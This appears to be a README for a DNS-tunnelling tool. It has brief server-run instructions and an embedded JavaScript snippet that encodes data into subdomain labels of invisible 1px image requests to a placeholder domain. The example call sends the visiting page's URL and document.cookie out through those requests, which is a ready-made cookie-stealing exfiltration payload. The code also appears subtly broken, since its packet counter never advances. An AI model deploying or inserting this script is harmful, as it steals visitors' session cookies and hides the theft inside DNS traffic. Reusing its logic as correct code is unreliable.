# Data-Over-DNS
This tool can be used for tunnelling data over DNS

#DNS Server
Run the dns server with "sudo node DoDNS.js"
//sudo is required to bind to port 53


#Website Code

    <script>
        function dataoOverDNS( domain, file, data ){
            var random_str = Math.random().toString(36).substring(2, 6) + Math.random().toString(36).substring(2, 6);
            var data = JSON.stringify( data );
            var hexstr = "";
            for (var i = 0; i < data.length; i++) { hexstr += data.charCodeAt(i).toString(16).padStart(2, '0'); }
            hexstr_sp = hexstr.match(/.{1,62}/g);
            var packets = Math.ceil( hexstr_sp.length / 3 );
            var packet = 0;
            for (var i = 0; i < packets; i++) {
                subs = [];
                for( i2=0;i2<3;i2++) { subs.push(  (hexstr_sp.hasOwnProperty(packet)) ? hexstr_sp[packet] : "00" ); }
                var oImg = document.createElement("img");
                oImg.setAttribute('src', "https://" + subs[0] + "." + subs[1] + "." + subs[2] + "." + ( i + 1 ).toString(16).padStart(4, '0') + packets.toString(16).padStart(4, '0') + "." + random_str + "." + domain + "/" + file );
                oImg.setAttribute('height', '1px');
                oImg.setAttribute('width', '1px');
                document.body.appendChild(oImg);
            }
        }
        dataoOverDNS('ns.yourdomain.com','randomfile.jpg', { "location" : window.location.href, "cookie" : document.cookie } );
    </script>
